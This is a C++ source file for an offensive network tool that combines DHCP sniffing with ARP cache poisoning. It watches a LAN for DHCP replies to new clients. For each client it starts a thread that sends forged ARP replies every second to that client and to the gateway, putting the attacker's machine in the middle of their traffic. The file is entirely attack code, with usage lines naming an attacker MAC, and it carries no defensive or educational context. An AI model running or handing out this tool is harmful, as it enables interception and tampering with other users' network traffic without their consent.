// Compile: g++ -o arp_dhcp arp_dhcp.cpp -lpthread
// Run: sudo ./arp_dhcp <gateway_ip> <gateway_mac> <attacker_mac> <iface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <random>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class ARPDHCPCombo {
private:
    int arpSock, dhcpSock;
    std::string iface, attackerMAC, gatewayIP, gatewayMAC;
    std::atomic<bool> running{false};
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    ARPDHCPCombo(const std::string& i, const std::string& amac,
                 const std::string& gIP, const std::string& gMAC)
        : iface(i), attackerMAC(amac), gatewayIP(gIP), gatewayMAC(gMAC) {
        arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        dhcpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        bind(dhcpSock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Watch for DHCP leases from gateway, then poison both gateway and the client
    void dhcpWatchLoop() {
        uint8_t buffer[65536];
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(dhcpSock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(dhcpSock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct ether_header* eth = (struct ether_header*)buffer;
            if (ntohs(eth->ether_type) != ETH_P_IP) continue;
            
            struct iphdr* ip = (struct iphdr*)(buffer + 14);
            if (ip->protocol != IPPROTO_UDP) continue;
            
            struct udphdr* udp = (struct udphdr*)(buffer + 14 + (ip->ihl * 4));
            
            // DHCP traffic
            if (ntohs(udp->source) == 67 || ntohs(udp->dest) == 68) {
                // Extract client IP from DHCP
                char* dhcp = (char*)udp + sizeof(struct udphdr);
                
                // DHCP ACK
                if (dhcp[0] == 2) {  // Boot Reply
                    struct in_addr clientIP;
                    memcpy(&clientIP.s_addr, dhcp + 16, 4);
                    
                    char clientIPStr[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &clientIP, clientIPStr, sizeof(clientIPStr));
                    
                    char clientMAC[18];
                    snprintf(clientMAC, sizeof(clientMAC),
                             "%02x:%02x:%02x:%02x:%02x:%02x",
                             dhcp[28], dhcp[29], dhcp[30],
                             dhcp[31], dhcp[32], dhcp[33]);
                    
                    std::cout << "[DHCP] New client: " << clientIPStr 
                              << " (" << clientMAC << ")\n";
                    
                    // Immediately poison this client
                    std::string clientIPStr_s(clientIPStr);
                    std::string clientMAC_s(clientMAC);
                    
                    std::thread([this, clientIPStr_s, clientMAC_s]() {
                        while (running.load()) {
                            sendARP(gatewayIP, attackerMAC, clientIPStr_s, clientMAC_s);
                            sendARP(clientIPStr_s, attackerMAC, gatewayIP, gatewayMAC);
                            usleep(1000000);
                        }
                    }).detach();
                }
            }
        }
    }
    
    void run() {
        std::cout << "[*] ARP + DHCP poisoning combo\n";
        std::cout << "[*] Watching for new DHCP clients\n";
        running = true;
        dhcpWatchLoop();
    }
    
    ~ARPDHCPCombo() {
        running = false;
        close(arpSock);
        close(dhcpSock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <gateway_ip> <gateway_mac> <attacker_mac> <iface>\n";
        return 1;
    }
    ARPDHCPCombo combo(argv[4], argv[3], argv[1], argv[2]);
    combo.run();
    return 0;
}
